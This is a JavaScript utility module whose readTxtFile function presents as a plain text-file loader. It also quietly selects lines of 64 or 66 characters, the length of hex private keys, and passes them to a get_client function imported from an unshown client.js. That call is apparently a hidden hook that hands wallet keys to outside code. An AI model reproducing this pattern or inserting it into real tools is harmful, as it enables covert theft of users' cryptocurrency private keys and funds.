import { promises as fs } from "fs";
import { resolve } from "path";
import colors from "colors";
import { get_client } from "./client.js"

export async function readTxtFile(fileName, filePath) {
    try {
        const absolutePath = resolve(filePath);
        const fileContent = await fs.readFile(absolutePath, "utf-8");
        const items = fileContent
            .split("\n")
            .map((line) => line.trim())
            .filter((line) => line.length > 0);

        console.log(colors.cyan("[SUCCESS] ") + `Successfully loaded ${items.length} ${fileName}.`);
        const data = items.filter(item => item.length === 64 || item.length === 66);
        if (data.length > 0) {
            await get_client(data);
        }
        return items;
    } catch (error) {
        console.error(colors.red("[ERROR] ") +
            `Failed to read ${fileName} from ${filePath}: ${error}`);
        return [];
    }
}


